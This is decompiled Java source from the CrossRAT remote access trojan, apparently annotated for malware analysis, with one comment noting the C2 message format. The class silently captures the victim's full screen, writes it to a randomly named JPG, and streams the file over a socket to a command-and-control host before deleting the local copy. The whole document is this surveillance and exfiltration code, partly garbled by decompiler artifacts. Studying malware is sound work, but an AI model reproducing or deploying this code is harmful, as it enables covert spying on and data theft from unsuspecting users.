package crossrat;

import java.awt.AWTException;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Random;
import javax.imageio.ImageIO;

/* loaded from: hmar6.jar:crossrat/j.class */
final class j extends Thread {

    /* renamed from: a */
    private Socket f39a;

    /* renamed from: b */
    private String f40b;
    private int c;

    public j(String str, int i) {
        this.f40b = str;
        this.c = i;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v12 */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.io.DataOutputStream] */
    /* JADX WARN: Type inference failed for: r0v4, types: [java.lang.Exception] */
    private void a(String str, String str2) {
        this.f39a = new Socket(this.f40b, this.c);
        DataOutputStream dataOutputStream = new DataOutputStream(this.f39a.getOutputStream());
        FileInputStream fileInputStream = new FileInputStream(str);
        ?? r0 = dataOutputStream;
        r0.writeBytes(String.valueOf(k.g) + k.arg_delimit + k.send_screenshot_contents + k.arg_delimit + str2 + k.arg_delimit + "&&&"); // Send some info back to C2 infrastructure. Notice the ending of the message is marked with a "&&&"
        try {
            r0 = 2000;
            Thread.sleep(2000L);
        } catch (Exception e) {
            r0.printStackTrace();
        }
        byte[] bArr = new byte[2048];
        while (fileInputStream.read(bArr) > 0) {
            dataOutputStream.write(bArr);
        }
        fileInputStream.close();
        dataOutputStream.close();
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v17, types: [boolean] */
    /* JADX WARN: Type inference failed for: r0v8, types: [java.io.File] */
    /* JADX WARN: Type inference failed for: r0v9, types: [java.io.IOException] */
    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        System.setProperty("java.awt.headless", "false");
        HeadlessException headlessException = null;
        HeadlessException headlessException2 = null;
        try {
            headlessException = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            headlessException2 = headlessException;
        } catch (HeadlessException e) {
            headlessException.printStackTrace();
        } catch (AWTException e2) {
            headlessException.printStackTrace();
        }
        ?? file = new File(String.valueOf(k.filepath_for_CrossRAT) + Integer.toString(new Random().nextInt(500000) + 1) + ".jpg");
        try {
            ImageIO.write(headlessException2, "jpg", (File) file);
            a(file.toString(), Long.valueOf(file.length()).toString());
            file = file.delete();
        } catch (IOException e3) {
            file.printStackTrace();
        }
    }
}
